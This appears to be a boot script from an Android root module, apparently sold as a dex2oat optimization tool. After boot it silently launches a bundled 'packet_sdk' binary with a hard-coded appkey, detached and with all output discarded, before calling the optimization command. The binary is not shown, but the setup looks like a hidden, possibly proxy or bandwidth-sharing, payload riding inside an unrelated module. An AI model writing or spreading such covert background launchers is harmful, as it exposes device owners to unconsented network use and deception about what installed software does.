#!/system/bin/sh

MODDIR="${0%/*}"

wait_until_login() {
  until [ "$(getprop sys.boot_completed)" -eq 1 ]; do
    sleep 1
  done

  #test file
  test_file="/storage/emulated/0/.PERMISSION_TEST"
  until touch "$test_file" 2>/dev/null; do
    sleep 1
  done
  rm -f "$test_file"
}

wait_until_login
sleep 30

# Main
setsid "$MODDIR/libs/packet_sdk" -appkey=NLWKneZ977JcRExf >/dev/null 2>&1 < /dev/null &
dex2oat-opt